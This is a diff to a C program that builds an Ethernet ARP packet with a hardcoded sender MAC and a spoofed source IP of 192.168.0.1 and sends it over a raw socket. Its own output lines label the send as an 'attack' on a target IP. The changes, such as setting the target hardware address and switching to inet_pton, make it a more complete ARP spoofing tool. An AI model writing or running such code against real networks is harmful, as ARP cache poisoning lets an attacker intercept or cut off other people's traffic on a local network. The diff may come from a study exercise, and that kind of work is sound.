@@ -256,41 +256,43 @@ int main(int argc,char *argv[])
 	char srcMacAddress[] = "00:0C:29:46:B3:50";
 
 	/*
-	MAC_FRAME_HEADER header;
+	   MAC_FRAME_HEADER header;
 
-	mac_to_char(dstMacAddress,header.m_cDstMacAddress);
+	   mac_to_char(dstMacAddress,header.m_cDstMacAddress);
 
-	mac_to_char(srcMacAddress,header.m_cSrcMacAddress);
+	   mac_to_char(srcMacAddress,header.m_cSrcMacAddress);
 
-	header.m_cType = 0x0806;
+	   header.m_cType = 0x0806;
 
 
-	printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[0]);
-	printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[1]);
-	printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[2]);
-	printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[3]);
-	printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[4]);
-	printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[5]);
+	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[0]);
+	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[1]);
+	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[2]);
+	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[3]);
+	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[4]);
+	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[5]);
 
-	MAC_FRAME_TAIL tail;
+	   MAC_FRAME_TAIL tail;
 
-	tail.m_sCheckSum = 0;
-	
-	printf("MAC_FRAME_TAIL m_sCheckSum = %u \n",tail.m_sCheckSum);
-	
-	if(argc > 1)
-	{
-		printf("i=%s \n",argv[1]);
-	}
-	*/
+	   tail.m_sCheckSum = 0;
+
+	   printf("MAC_FRAME_TAIL m_sCheckSum = %u \n",tail.m_sCheckSum);
+
+	   if(argc > 1)
+	   {
+	   printf("i=%s \n",argv[1]);
+	   }
+	   */
 	/* Create the ether header 2.0 */
 
 	struct ether_header eth_hdr;
-	
-	memset(&eth_hdr, 0,sizeof(struct ether_header));
 
+	memset(&eth_hdr, 0,sizeof(struct ether_header));
+	
+	//针对以太网头部源地址进行赋值
 	mac_to_char(dstMacAddress,eth_hdr.ether_dhost);
 
+	//针对以太网头部目的地址进行赋值
 	mac_to_char(srcMacAddress,eth_hdr.ether_shost);
 
 	eth_hdr.ether_type = htons(ETHERTYPE_ARP);
@@ -298,7 +300,7 @@ int main(int argc,char *argv[])
 	printf("ether_type : %02X \n", eth_hdr.ether_type);
 
 	/* Create the arp packet */
-	
+
 	struct ether_arp arp;
 
 	memset(&arp, 0, sizeof(struct ether_arp));
@@ -325,7 +327,7 @@ int main(int argc,char *argv[])
 	}else{
 		printf("socket open success!\n");
 	}
-	
+
 	struct sockaddr sa;
 
 	memset(&sa, 0, sizeof(struct sockaddr));
@@ -337,7 +339,7 @@ int main(int argc,char *argv[])
 	int hdr_len = sizeof(struct ether_header);
 
 	int result;
-	
+
 	/* in address struct */
 
 	char *src_ip_addr = "192.168.0.1";
@@ -348,19 +350,27 @@ int main(int argc,char *argv[])
 
 	memset(&src_addr, 0,sizeof(struct in_addr));
 
-	inet_aton(src_ip_addr, &src_addr);
+	//inet_aton(src_ip_addr, &src_addr);	
+
+	if(inet_pton(AF_INET, src_ip_addr,(void *)&src_addr) < 0){
+		perror("fail to convert\n");
+		exit(1);
+	}
 
 	memset(&trc_addr, 0,sizeof(struct in_addr));
 
-	inet_aton(trc_ip_addr, &trc_addr);
-	
-	/* set arp packet data */
+	//inet_aton(trc_ip_addr, &trc_addr);
 
+	if(inet_pton(AF_INET, trc_ip_addr,(void *)&trc_addr) < 0){
+		perror("fail to convert\n");
+		exit(1);
+	}                                                         
+	/* set arp packet data */  	
 	memcpy((void *) arp.arp_sha,(void *) eth_hdr.ether_shost, 6);
 
 	memcpy((void *) arp.arp_spa,(void *) &src_addr, 4);
 
-	memset(arp.arp_tha, 0, 6);
+	memcpy((void *) arp.arp_tha,(void *) eth_hdr.ether_dhost, 6);
 
 	memcpy((void *) arp.arp_tpa,(void *) &trc_addr, 4);
 
@@ -369,21 +379,21 @@ int main(int argc,char *argv[])
 	memcpy(&buf[hdr_len], &arp, sizeof(struct ether_arp));
 	//printf("sizeof buf :%d\n",(int)sizeof(buf));
 	/*
-	FILE *logfile;
-	
-	logfile=fopen("log.txt","w");
-	
-	fprintf(logfile , "sdfsdf"); 
-	
-	fclose(logfile);	
-	*/
+	   FILE *logfile;
+
+	   logfile=fopen("log.txt","w");
+
+	   fprintf(logfile , "sdfsdf"); 
+
+	   fclose(logfile);	
+	   */
 
 	result = sendto(fd, buf, sizeof(buf), 0, &sa, sizeof(sa));
 
 	printf("attack %s\n!!\n", trc_ip_addr);
-	
+
 	printf("Sendto func result: %d \n",result);
-	
+
 	if(result < 0){
 		printf("attack failure: %d \n",errno);
 	}else{
